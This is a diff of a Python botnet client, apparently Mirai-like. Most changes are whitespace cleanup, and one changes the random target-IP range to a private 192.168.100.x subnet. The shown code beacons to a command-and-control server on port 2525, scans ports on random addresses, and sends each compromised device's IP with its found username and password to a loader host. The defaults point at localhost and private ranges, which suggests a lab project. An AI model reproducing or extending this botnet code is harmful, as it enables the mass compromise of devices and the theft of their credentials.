@@ -22,20 +22,20 @@ from botenv import rando
 class bot:
 	def __init__(self, name):
 		self.name = name
-	
+
 	# Heart beat function to command & control server
 	def heart_beat(self, cc_ip='127.0.0.1', hb_time=60):
 		while True:
 			cc = socket.socket()
 			#loader = socket.socket()
 			port = 2525
-			
+
 			print('Waiting for connection')
 			try:
 				cc.connect((cc_ip, port))
 			except socket.error as e:
 				print(str(e))
-			
+
 			Response = cc.recv(1024)
 
 			heartbeat = "0x00 0x00"
@@ -43,7 +43,7 @@ class bot:
 			Response_cc = cc.recv(1024)
 			print(Response_cc.decode('utf-8'))
 			time.sleep(hb_time)
-			
+
 			cc.close()
 			time.sleep(hb_time)
 
@@ -77,14 +77,14 @@ class bot:
 					continue
 		except:
 			pass
-			
+
 		'''
 		for i in ports:
 			if results[i] == True:
 				print(results)
 				return results
 		'''
-		
+
 		if results['ports']:
 			return results
 
@@ -93,8 +93,8 @@ class bot:
 		while True:
 			o1 = rando.ip_oct(192, 192)
 			o2 = rando.ip_oct(168, 168)
-			o3 = rando.ip_oct(12, 17)
-			o4 = rando.ip_oct(2, 2)
+			o3 = rando.ip_oct(100, 100)
+			o4 = rando.ip_oct(3, 8)
 			ip = str(o1)+'.'+str(o2)+'.'+str(o3)+'.'+str(o4)
 			return ip
 
@@ -106,13 +106,13 @@ class bot:
 	def report_working(self, loader_ip='127.0.0.1', device='', auth_info=''):
 		loader = socket.socket()
 		port = 2525
-		
+
 		print('Waiting for connection')
 		try:
 			loader.connect((loader_ip, port))
 		except socket.error as e:
 			print(str(e))
-		
+
 		Response = loader.recv(1024)
 		working = device['ip'] + '_' + auth_info[0] + '_' + auth_info[1]
 		loader.send(str.encode(working))
@@ -163,7 +163,7 @@ class bot:
 
 
 def main():
-	pass 
- 
-if __name__ == "__main__": 
+	pass
+
+if __name__ == "__main__":
 	main()
